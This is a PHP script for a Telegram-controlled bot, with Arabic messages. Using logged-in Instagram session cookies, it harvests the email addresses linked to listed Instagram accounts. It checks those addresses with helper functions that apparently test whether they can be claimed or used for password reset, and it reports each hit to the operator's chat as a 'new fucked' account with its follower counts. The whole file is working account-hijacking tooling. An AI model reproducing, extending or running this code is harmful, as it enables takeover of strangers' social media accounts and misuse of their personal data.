<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_contents('config.json'),1);
$id = $config['id'];
$token = $config['token'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'index.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$se = 100;
$i = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$aol = 0;
$true = 0;
$false = 0;
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"*جاري الفحص 🙂:-*",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'𝙲𝚑𝚎𝚌𝚔𝚎𝚍  : '.$i,'callback_data'=>'fgf']],
                [['text'=>'𝙾𝚗 𝚄𝚜𝚎𝚛 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>'𝐌𝐀𝐈𝐋: '.$mail,'callback_data'=>'ghj']],
                [['text'=>"𝙶𝚖𝚊𝚒𝚕: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝚈𝚊𝚑𝚘𝚘: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'𝙼𝚊𝚒𝚕𝚁𝚞: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝙷𝚘𝚝𝚖𝚊𝚒𝚕: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'𝙰𝚘𝚕: '.$aol,'callback_data'=>'fahmyaol']],
                [['text'=>'𝙻𝚒𝚟𝚎 ✅ : '.$true,'callback_data'=>'gj']],
                [['text'=>'𝙳𝚒𝚎𝚍 ❎: '.$false,'callback_data'=>'dghkf']]
            ]
        ])
]);
$se = 100;
$editAfter = 1;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false and !is_string($info)) {
        $mail = trim($info['mail']);
        $usern = $info['user'];
        $e = explode('@', $mail);
               if (preg_match('/(live|hotmail|outlook|yahoo|Yahoo|aol|Aol)\.(com)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
                    if(checkMail($mail)){
                        $inInsta = inInsta($mail);
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'hotmail.com') or strpos($mail,'outlook.com') or strpos($mail,'live.com')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo.com')){
                                    $yahoo += 1;
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                } elseif(strpos($mail, 'aol.com')){ 
                                	$aol += 1;
                                }
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "* 𝒉𝒊 𝒔𝒊𝒓 𝒏𝒆𝒘 𝒇𝒖𝒄𝒌𝒆𝒅✅ 𖤧  * \n↣↣↣↣↣↣↣↣↣↣↣\n* .♟.U𝒔𝒆𝒓 :* [$usern](instagram.com/$usern)\n* .♟.E𝒎𝒂𝒊𝒍 :* [$mail]\n* .♟.F𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔: * $follow\n* .♟.F𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 : * $following\n* .♟.P𝒐𝒔𝒕 :* $media\n* 𝖙𝖎𝖒𝖊 : ".date("Y")."/".date("n")."/".date("d")." : " . date('g:i') . "\n* 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 : [$phone]\n .↣↣↣↣↣↣↣↣↣↣↣\n*Ch :* [@E77711]\n*By :* [@E77710]",
                                
                                'parse_mode'=>'markdown']);
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>'𝙲𝚑𝚎𝚌𝚔𝚎𝚍 : '.$i,'callback_data'=>'fgf']],
                                            [['text'=>'𝙾𝚗 𝚄𝚜𝚎𝚛 : '.$user,'callback_data'=>'fgdfg']],
                                            [['text'=>'𝐌𝐀𝐈𝐋: '.$mail,'callback_data'=>'ghj']],
                                            [['text'=>"𝙶𝚖𝚊𝚒𝚕: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝚈𝚊𝚑𝚘𝚘: $yahoo",'callback_data'=>'gdfgfd']],
                                            [['text'=>'𝙼𝚊𝚒𝚕𝚁𝚞: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝙷𝚘𝚝𝚖𝚊𝚒𝚕: '.$hotmail,'callback_data'=>'ghj']],
                                            [['text'=>'𝙰𝚘𝚕: '.$aol,'callback_data'=>'fahmyaol']],
                                            [['text'=>'𝙻𝚒𝚟𝚎 ✅ : '.$true,'callback_data'=>'gj']],
                                            [['text'=>'𝙳𝚒𝚎𝚍 ❎ : '.$false,'callback_data'=>'dghkf']]
                                        ]
                                    ])
                                ]);
                                $true += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                          echo "No Rest $mail\n";
                        }
                    } else {
                        $false +=1;
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
          echo "BlackList - $mail\n";
        }
    } elseif(is_string($info)){
        bot('sendMessage',[
            'chat_id'=>$id,
            'text'=>"الحساب - `$screen`\n تم حظره من *الفحص*",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                        [['text'=>'نقل اللسته الي حساب اخر 🔄','callback_data'=>'moveList&'.$screen]],
                        [['text'=>'حذف الحساب ⛔','callback_data'=>'del&'.$screen]]
                    ]    
            ]),
            'parse_mode'=>'markdown'
        ]);
        exit;
    } else {
        echo "Not Bussines - $user\n";
    }
    usleep(750000);
    $i++;
    if($i == $editAfter){
        bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>'𝙲𝚑𝚎𝚌𝚔𝚎𝚍 : '.$i,'callback_data'=>'fgf']],
                    [['text'=>'𝙾𝚗 𝚄𝚜𝚎𝚛 : '.$user,'callback_data'=>'fgdfg']],
                    [['text'=>'𝐌𝐀𝐈𝐋: '.$mail,'callback_data'=>'ghj']],
                    [['text'=>"𝙶𝚖𝚊𝚒𝚕: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝚈𝚊𝚑𝚘𝚘: $yahoo",'callback_data'=>'gdfgfd']],
                    [['text'=>'𝙼𝚊𝚒𝚕𝚁𝚞: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝙷𝚘𝚝𝚖𝚊𝚒𝚕: '.$hotmail,'callback_data'=>'ghj']],
                    [['text'=>'𝙰𝚘𝚕: '.$aol,'callback_data'=>'fahmyaol']],
                    [['text'=>'𝙻𝚒𝚟𝚎 ✅ : '.$true,'callback_data'=>'gj']],
                    [['text'=>'𝙳𝚒𝚎𝚍 ❎ : '.$false,'callback_data'=>'dghkf']]
                ]
            ])
        ]);
        $editAfter += 1;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>" تم الانتهاء من الفحص🙂 : ".explode(':',$screen)[0]]);

